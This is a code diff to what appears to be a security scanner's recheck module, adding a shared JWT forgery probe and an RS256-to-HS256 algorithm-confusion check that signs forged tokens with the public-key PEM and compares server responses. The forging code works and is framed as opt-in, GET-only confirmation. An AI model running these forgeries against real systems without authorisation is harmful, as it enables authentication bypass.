@@ -652,6 +652,87 @@ async def _recheck_graphql(finding, fetch, timeout):
                         "nests __schema (lead)")
 
 
+async def _hmac_forge_accept_probe(fetch, timeout, endpoint, header, payload,
+                                   key_bytes, digest, src, kind):
+    """Shared forge-accept differential for HMAC-verified JWTs (weak-key OR
+    RS256->HS256 confusion). Forge ``header.payload`` (plus a benign marker claim)
+    signed with HMAC(``key_bytes``) and send it TWICE bracketing a bad-signature
+    control. Confirm ONLY when the forged token is accepted BOTH times AND the control
+    is rejected (401/403) — so a stateful endpoint (nonce/single-use) can't fake it and
+    the control's rejection is attributable to its signature alone. GET-only."""
+    import hmac as _hmac
+    import json as _json
+    import secrets as _secrets
+    from core.swarm_workers.vuln.jwt import _b64url_encode
+    payload = dict(payload)
+    payload["viper_recheck"] = _secrets.token_hex(6)   # benign marker; no privilege change
+    h_b64 = _b64url_encode(_json.dumps(header, separators=(",", ":")).encode())
+    p_b64 = _b64url_encode(_json.dumps(payload, separators=(",", ":")).encode())
+    signing_input = (h_b64 + "." + p_b64).encode("ascii")
+    good_sig = _b64url_encode(_hmac.new(key_bytes, signing_input, digest).digest())
+    forged = f"{h_b64}.{p_b64}.{good_sig}"
+    control = f"{h_b64}.{p_b64}.{_b64url_encode(b'viper-invalid-signature')}"
+
+    async def _probe(token):
+        headers = {"Authorization": f"Bearer {token}"}
+        if src and src != "authorization":     # token was set as a cookie
+            headers["Cookie"] = f"{src}={token}"
+        return await fetch("GET", endpoint, headers=headers, timeout=timeout,
+                           use_session_auth=False)
+    forged_r = await _probe(forged)
+    control_r = await _probe(control)
+    forged_r2 = await _probe(forged)
+    if forged_r is None or control_r is None or forged_r2 is None:
+        return False, 0.0, "forge-probe request failed (lead)"
+    fs = getattr(forged_r, "status", 0)
+    cs = getattr(control_r, "status", 0)
+    fs2 = getattr(forged_r2, "status", 0)
+    forged_ok = (200 <= fs < 300) and (200 <= fs2 < 300)
+    if forged_ok and cs in (401, 403):
+        return True, 0.85, (f"server accepted a {kind}-forged token REPEATABLY (HTTP "
+                            f"{fs}/{fs2}) but rejected a bad-signature control (HTTP {cs}) "
+                            "— stateless signature verification; JWT forgery confirmed (CWE-347)")
+    if (200 <= fs < 300) and not (200 <= fs2 < 300):
+        return False, 0.2, (f"forged token accepted once (HTTP {fs}) then rejected on repeat "
+                            f"(HTTP {fs2}) — order/state-dependent (nonce/single-use/replay), "
+                            "not a stateless signature bypass (lead)")
+    if (200 <= fs < 300) and (200 <= cs < 300):
+        return False, 0.2, ("both the forged and the bad-signature token were accepted — "
+                            "the endpoint does not verify signatures / needs no auth (lead)")
+    return False, 0.2, (f"forged token not accepted (HTTP {fs}) — forgery unconfirmed at "
+                        "this endpoint (lead)")
+
+
+async def _recheck_jwt_alg_confusion(finding, fetch, timeout):
+    """Confirm an RS256->HS256 algorithm-confusion bypass. The RSA public key is public
+    (jwks.json), so a verifier that trusts the token's alg header can be tricked into
+    HMAC-verifying an attacker HS256 token whose secret IS the public-key PEM. Opt-in
+    like the weak-key path: stays a LEAD until an operator jwt_probe_endpoint proves the
+    forged HS256 token is accepted where a bad-signature control is rejected. The forged
+    token carries the original claims + a benign marker (no privilege change); GET-only."""
+    import hashlib as _hashlib
+    from core.swarm_workers.vuln.jwt import _parse_jwt
+    endpoint = (finding.get("jwt_probe_endpoint") or "").strip()
+    if not endpoint:
+        return False, 0.3, ("RS256->HS256 alg-confusion candidate (RSA public key published + "
+                            "an identity token) — supply jwt_probe_endpoint (an in-scope authed "
+                            "GET) to confirm the forged HS256 token is accepted (lead)")
+    tok = finding.get("jwt_token") or ""
+    pem = finding.get("jwt_pubkey_pem") or ""
+    if not tok or not pem:
+        return False, 0.0, "alg-confusion finding missing token / public-key PEM (lead)"
+    parsed = _parse_jwt(tok)
+    if not parsed:
+        return False, 0.0, "could not parse the RS-signed token to forge (lead)"
+    header, payload, _ = parsed
+    header = dict(header)
+    header["alg"] = "HS256"    # downgrade to HMAC; the public-key PEM is now the secret
+    src = (finding.get("jwt_source") or "authorization").lower()
+    return await _hmac_forge_accept_probe(
+        fetch, timeout, endpoint, header, payload, pem.encode("utf-8"),
+        _hashlib.sha256, src, "public-key-as-HMAC (RS256->HS256 confusion)")
+
+
 async def _recheck_jwt(finding, fetch, timeout):
     """Confirm a weak-HMAC-key JWT only by proving the SERVER ACCEPTS A FORGERY.
 
@@ -665,6 +746,8 @@ async def _recheck_jwt(finding, fetch, timeout):
     signatures with the weak key, so arbitrary forgery is possible (CWE-347). GET-only,
     no privilege escalation. Non-weak-key jwt observations stay leads."""
     vt = (finding.get("vuln_type") or "").lower()
+    if ":alg_confusion" in vt:
+        return await _recheck_jwt_alg_confusion(finding, fetch, timeout)
     if ":weak_key" not in vt or vt.endswith(("_noauth", "_sample")):
         return False, 0.3, "jwt observation — no safe read-only auto-confirmation (lead)"
     endpoint = (finding.get("jwt_probe_endpoint") or "").strip()
@@ -678,62 +761,17 @@ async def _recheck_jwt(finding, fetch, timeout):
     if not tok or key is None or alg not in ("HS256", "HS384", "HS512"):
         return False, 0.0, "jwt finding missing token/key/alg for a forge-probe (lead)"
     import hashlib as _hashlib
-    import hmac as _hmac
-    import json as _json
-    import secrets as _secrets
-    from core.swarm_workers.vuln.jwt import _b64url_encode, _parse_jwt
+    from core.swarm_workers.vuln.jwt import _parse_jwt
     parsed = _parse_jwt(tok)
     if not parsed:
         return False, 0.0, "could not parse the original JWT to forge (lead)"
     header, payload, _ = parsed
-    payload = dict(payload)
-    payload["viper_recheck"] = _secrets.token_hex(6)   # benign marker; no privilege change
     digest = {"HS256": _hashlib.sha256, "HS384": _hashlib.sha384,
               "HS512": _hashlib.sha512}[alg]
-    h_b64 = _b64url_encode(_json.dumps(header, separators=(",", ":")).encode())
-    p_b64 = _b64url_encode(_json.dumps(payload, separators=(",", ":")).encode())
-    signing_input = (h_b64 + "." + p_b64).encode("ascii")
-    good_sig = _b64url_encode(_hmac.new(key.encode("utf-8"), signing_input, digest).digest())
-    forged = f"{h_b64}.{p_b64}.{good_sig}"
-    control = f"{h_b64}.{p_b64}.{_b64url_encode(b'viper-invalid-signature')}"
     src = (finding.get("jwt_source") or "authorization").lower()
-
-    async def _probe(token):
-        headers = {"Authorization": f"Bearer {token}"}
-        if src and src != "authorization":     # token was set as a cookie
-            headers["Cookie"] = f"{src}={token}"
-        return await fetch("GET", endpoint, headers=headers, timeout=timeout,
-                           use_session_auth=False)
-    # Send the forged token TWICE, bracketing the control. A stateless weak-key
-    # verifier accepts the SAME forged token every time; a stateful endpoint (nonce,
-    # single-use, first-request-wins) rejects the repeat — so a control-401 there is
-    # order/state-dependent, not a signature verdict. Confirm only when the forged
-    # token is accepted BOTH times AND the control is rejected: then the sole reason
-    # the control differs is its bad signature, proving weak-key signature bypass.
-    forged_r = await _probe(forged)
-    control_r = await _probe(control)
-    forged_r2 = await _probe(forged)
-    if forged_r is None or control_r is None or forged_r2 is None:
-        return False, 0.0, "forge-probe request failed (lead)"
-    fs = getattr(forged_r, "status", 0)
-    cs = getattr(control_r, "status", 0)
-    fs2 = getattr(forged_r2, "status", 0)
-    forged_ok = (200 <= fs < 300) and (200 <= fs2 < 300)
-    if forged_ok and cs in (401, 403):
-        return True, 0.85, (f"server accepted a weak-key-forged token REPEATABLY (HTTP "
-                            f"{fs}/{fs2}) but rejected a bad-signature control (HTTP {cs}) "
-                            "— stateless signature verification with the recovered key; "
-                            "JWT forgery confirmed (CWE-347)")
-    if (200 <= fs < 300) and not (200 <= fs2 < 300):
-        return False, 0.2, (f"forged token accepted once (HTTP {fs}) then rejected on repeat "
-                            f"(HTTP {fs2}) — order/state-dependent (nonce/single-use/replay), "
-                            "not a stateless weak-key signature bypass (lead)")
-    if (200 <= fs < 300) and (200 <= cs < 300):
-        return False, 0.2, ("both the forged and the bad-signature token were accepted — "
-                            "the endpoint does not verify signatures / needs no auth; not "
-                            "a weak-key forgery proof (lead)")
-    return False, 0.2, (f"forged token not accepted (HTTP {fs}) — weak key recovered but "
-                        "forgery unconfirmed at this endpoint (lead)")
+    return await _hmac_forge_accept_probe(
+        fetch, timeout, endpoint, header, payload, key.encode("utf-8"), digest, src,
+        "weak-key")
 
 
 async def _recheck_ssrf(finding, fetch, timeout):
